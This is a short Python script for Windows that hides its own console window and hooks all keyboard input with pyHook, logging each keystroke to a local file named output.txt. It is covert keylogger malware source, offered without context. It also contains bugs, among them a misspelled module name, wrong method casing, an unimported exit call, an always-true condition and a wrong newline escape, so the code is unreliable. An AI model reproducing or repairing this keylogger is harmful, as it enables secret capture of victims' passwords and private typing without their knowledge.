import win32api
import win32console
import win32gui

import pythoncom, pyHook

win = win32cinsole.GetConsoleWindow()
win32gui.showWindow(win, 0)

def onKeyboardEvent(event):
    if event.Ascii == 5:
        _exit(1)

    if event.Ascii != 0 or event.Ascii != 8:
        f = open('output.txt', 'r')
        buffer = f.read()
        f.close()
        f = open('output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()

hm = pyHook.HookManager()
hm.KeyDown = onKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()